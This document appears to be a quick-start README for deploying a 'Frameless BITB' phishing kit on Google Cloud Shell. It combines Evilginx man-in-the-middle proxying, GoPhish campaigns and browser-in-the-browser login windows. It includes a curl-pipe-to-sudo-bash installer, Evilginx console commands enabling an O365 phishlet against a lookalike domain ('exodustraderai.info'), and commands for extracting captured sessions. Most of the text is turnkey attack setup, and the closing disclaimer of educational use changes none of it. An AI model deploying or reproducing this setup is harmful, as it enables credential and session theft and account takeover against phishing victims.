# Frameless BITB - Quick Start Guide (Google Cloud Shell)

## 🚀 One-Command Installation

Run this single command in Google Cloud Shell to install everything:

```bash
sudo bash -c "$(curl -fsSL https://raw.githubusercontent.com/waelmas/frameless-bitb/main/setup-gcloud.sh)"
```

Or if you've already cloned this repository:

```bash
cd frameless-bitb
sudo bash setup-gcloud.sh
```

## 📋 Prerequisites

Before running the installation script, ensure:

1. **DNS Configuration**: Point your domain DNS records to your server IP
   - A Record: `exodustraderai.info` → Your Server IP
   - A Record: `*.exodustraderai.info` → Your Server IP

2. **Google Cloud Shell**: Open Google Cloud Shell or any Debian/Ubuntu-based system

3. **Root Access**: Script requires sudo/root privileges

## 🔧 Custom Domain Installation

To use a different domain:

```bash
sudo DOMAIN=yourdomain.com EMAIL=admin@yourdomain.com bash setup-gcloud.sh
```

## 📦 What Gets Installed

The script automatically installs and configures:

- ✅ **Evilginx** - Phishing framework with man-in-the-middle capabilities
- ✅ **GoPhish** - Phishing campaign management
- ✅ **Apache2** - Reverse proxy with content substitution
- ✅ **SSL Certificates** - Let's Encrypt or self-signed
- ✅ **Frameless BITB** - Browser-in-the-browser without iframes
- ✅ **Firewall** - UFW configured with proper rules
- ✅ **Systemd Services** - Auto-start on boot

## 🎯 Default Configuration

| Service | Port | Access |
|---------|------|--------|
| Apache (HTTPS) | 443 | Public |
| Apache (HTTP) | 80 | Public (redirects to HTTPS) |
| Evilginx | 8443 | Internal only |
| GoPhish Admin | 3333 | External (HTTPS) |
| GoPhish Phishing | 8080 | Internal only |

## 🔑 Access Your Services

### Evilginx Phishing Page
```
https://login.exodustraderai.info/?auth=2
```

### GoPhish Admin Panel
```
https://YOUR_SERVER_IP:3333
```
- Default credentials shown on first login
- Change immediately after first login

### Apache Logs
```bash
sudo tail -f /var/log/apache2/access_evilginx.log
sudo tail -f /var/log/apache2/error.log
```

## 🛠️ Management Commands

After installation, use these commands:

```bash
# Start all services
bitb-start

# Stop all services
bitb-stop

# Check status
bitb-status

# View logs
bitb-logs
```

## 📊 Evilginx Configuration

The script automatically configures Evilginx with:

```bash
config domain exodustraderai.info
config ipv4 external
blacklist noadd
phishlets hostname O365 exodustraderai.info
phishlets enable O365
lures create O365
```

To manually configure Evilginx:

```bash
cd /opt/evilginx
tmux new-session -s evilginx
./evilginx -developer
```

Inside Evilginx console:
```
config domain exodustraderai.info
config ipv4 external
blacklist noadd
phishlets hostname O365 exodustraderai.info
phishlets enable O365
lures create O365
lures get-url 0
```

Press `Ctrl+B` then `D` to detach from tmux session.

## 🔗 GoPhish Integration

To sync captured sessions from Evilginx to GoPhish:

```bash
sudo bash /home/user/frameless-bitb/gophish-integration.sh
```

Features:
- Extract sessions from Evilginx database
- Monitor sessions in real-time
- Export to CSV
- Create GoPhish campaigns
- Generate email templates

## 📁 Directory Structure

```
/opt/evilginx/          # Evilginx installation
├── evilginx            # Binary
├── phishlets/          # Phishing templates
└── redirectors/        # Redirect rules

/opt/gophish/           # GoPhish installation
├── gophish             # Binary
├── config.json         # Configuration
└── gophish.db          # Database

/var/www/               # Web pages
├── home/               # Landing page (base domain)
├── primary/            # Background page
└── secondary/          # BITB window

/etc/apache2/
└── custom-subs/        # Apache substitution configs
```

## 🔒 SSL Certificate Setup

### Automatic Let's Encrypt (Recommended)

If DNS is configured correctly, the script will automatically attempt to obtain Let's Encrypt certificates.

### Manual Let's Encrypt

If automatic fails or you want wildcard certificates:

```bash
sudo certbot certonly --manual \
  --preferred-challenges dns \
  -d exodustraderai.info \
  -d *.exodustraderai.info
```

Follow the prompts to add TXT records to your DNS.

### Self-Signed Certificates

The script creates self-signed certificates automatically if Let's Encrypt fails:
```
/etc/ssl/localcerts/exodustraderai.info/
├── fullchain.pem
└── privkey.pem
```

## 🧪 Testing Your Setup

1. **Check Services Status**:
   ```bash
   bitb-status
   ```

2. **Test Landing Page**:
   ```bash
   curl -Ik https://exodustraderai.info
   ```

3. **Test Phishing Page**:
   ```bash
   curl -Ik https://login.exodustraderai.info/?auth=2
   ```

4. **Check Evilginx**:
   ```bash
   sudo journalctl -u evilginx -f
   ```

5. **Check Apache**:
   ```bash
   sudo apache2ctl -t
   sudo systemctl status apache2
   ```

## 🎨 Customization

### Change BITB Browser Style

Edit Apache config to switch between Windows/Chrome and Mac/Chrome:

```bash
sudo nano /etc/apache2/sites-enabled/000-default.conf
```

Change:
```apache
Include /etc/apache2/custom-subs/mac-chrome.conf
```

To:
```apache
Include /etc/apache2/custom-subs/win-chrome.conf
```

Then restart Apache:
```bash
sudo systemctl restart apache2
```

### Customize Landing Pages

```bash
# Edit home page
sudo nano /var/www/home/index.html

# Edit primary (background) page
sudo nano /var/www/primary/index.html

# Edit scripts
sudo nano /var/www/primary/script.js
```

### Add Custom Phishlets

```bash
# Copy phishlet to Evilginx
sudo cp your-phishlet.yaml /opt/evilginx/phishlets/

# Enable in Evilginx
cd /opt/evilginx
./evilginx -developer
> phishlets hostname your-phishlet exodustraderai.info
> phishlets enable your-phishlet
```

## 🐛 Troubleshooting

### Apache Won't Start

```bash
# Check configuration
sudo apache2ctl configtest

# Check error logs
sudo tail -f /var/log/apache2/error.log

# Check port conflicts
sudo netstat -tulpn | grep :443
```

### Evilginx Won't Start

```bash
# Check logs
sudo journalctl -u evilginx -f

# Check DNS port (53)
sudo netstat -tulpn | grep :53

# Disable systemd-resolved DNS stub
sudo nano /etc/systemd/resolved.conf
# Set: DNSStubListener=no
sudo systemctl restart systemd-resolved
```

### SSL Certificate Issues

```bash
# Check certificate files
sudo ls -la /etc/letsencrypt/live/exodustraderai.info/
sudo ls -la /etc/ssl/localcerts/exodustraderai.info/

# Test SSL
openssl s_client -connect exodustraderai.info:443

# Renew Let's Encrypt
sudo certbot renew --dry-run
```

### Port 443 Already in Use

```bash
# Find what's using port 443
sudo lsof -i :443

# Kill the process or change Apache port
```

## 📊 Monitoring Captured Sessions

### View Evilginx Sessions

```bash
# Direct database query
sudo sqlite3 /root/.evilginx/data.db "SELECT * FROM sessions;"

# Using integration script
sudo bash gophish-integration.sh
# Select option 6 to view stats
```

### Real-time Monitoring

```bash
# Monitor Evilginx logs
sudo journalctl -u evilginx -f

# Monitor Apache access
sudo tail -f /var/log/apache2/access_evilginx.log

# Use integration script
sudo bash gophish-integration.sh
# Select option 2 for real-time monitoring
```

## 🔄 Updates and Maintenance

### Update Evilginx

```bash
cd /tmp
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make
sudo systemctl stop evilginx
sudo cp build/evilginx /opt/evilginx/
sudo systemctl start evilginx
```

### Update GoPhish

```bash
# Download latest version
wget https://github.com/gophish/gophish/releases/download/vX.X.X/gophish-vX.X.X-linux-64bit.zip
sudo systemctl stop gophish
sudo unzip -o gophish-*.zip -d /opt/gophish/
sudo systemctl start gophish
```

### Backup Data

```bash
# Backup Evilginx data
sudo tar -czf evilginx-backup-$(date +%Y%m%d).tar.gz /root/.evilginx/

# Backup GoPhish data
sudo tar -czf gophish-backup-$(date +%Y%m%d).tar.gz /opt/gophish/gophish.db
```

## 🛡️ Security Considerations

**⚠️ IMPORTANT DISCLAIMER**: This tool is for educational and authorized security testing ONLY.

1. Only use on domains you own
2. Only test against authorized targets
3. Follow responsible disclosure practices
4. Comply with all applicable laws and regulations
5. Use strong passwords for GoPhish admin
6. Implement IP whitelisting for sensitive operations
7. Monitor logs regularly
8. Keep all software updated

## 📞 Support

- **Issues**: https://github.com/waelmas/frameless-bitb/issues
- **Original Repo**: https://github.com/waelmas/frameless-bitb
- **Evilginx Docs**: https://help.evilginx.com/
- **GoPhish Docs**: https://docs.getgophish.com/

## 🎓 Additional Resources

- [Evilginx Mastery Course](https://academy.breakdev.org/evilginx-mastery)
- [Original BITB by mrd0x](https://github.com/mrd0x/BITB)
- [Protecting Evilginx with Cloudflare](https://www.jackphilipbutton.com/post/how-to-protect-evilginx-using-cloudflare-and-html-obfuscation)

## 📝 License

This project is for educational purposes only. Use responsibly and ethically.

---

**Made with ❤️ for security research and education**
